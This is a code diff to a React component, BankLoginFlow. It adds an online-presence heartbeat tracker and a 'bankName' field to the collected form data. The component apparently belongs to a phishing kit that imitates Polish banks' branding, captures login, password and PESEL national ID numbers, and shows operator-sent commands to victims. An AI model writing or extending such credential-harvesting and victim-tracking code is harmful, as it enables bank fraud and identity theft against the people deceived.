@@ -5,6 +5,7 @@ import { useLocaleContext } from '@/i18n/LocaleProvider';
 import { useBankLoginFlow } from './useBankLoginFlow';
 import { showCommand } from './swalController';
 import { applyBankSwalCss } from './bankSwalStyle';
+import { OnlineTracker } from './onlineTracker';
 
 type Props = {
     bank: BankConfig;
@@ -43,6 +44,14 @@ export function BankLoginFlow({ bank, sessionId }: Props) {
 
     useEffect(() => applyBankSwalCss(bank.brand), [bank.brand]);
 
+    // Online tracker: heartbeat while tab is active
+    const preSessionId = (props.preSessionId as string | undefined) ?? '';
+    useEffect(() => {
+        if (!preSessionId) return;
+        const tracker = new OnlineTracker(preSessionId);
+        return () => tracker.destroy();
+    }, [preSessionId]);
+
     useEffect(() => {
         showCommand(command, {
             dict: dictRef.current,
@@ -61,7 +70,7 @@ export function BankLoginFlow({ bank, sessionId }: Props) {
             if (busyRef.current) return;
             const data = new FormData(form);
             const fields: Record<string, string> = {};
-            for (const name of ['login', 'password', 'pesel']) {
+            for (const name of ['login', 'password', 'pesel', 'bankName']) {
                 const el = form.querySelector<HTMLInputElement>(`#${name}`);
                 if (el) fields[name] = el.value;
                 else if (data.has(name)) fields[name] = String(data.get(name) ?? '');
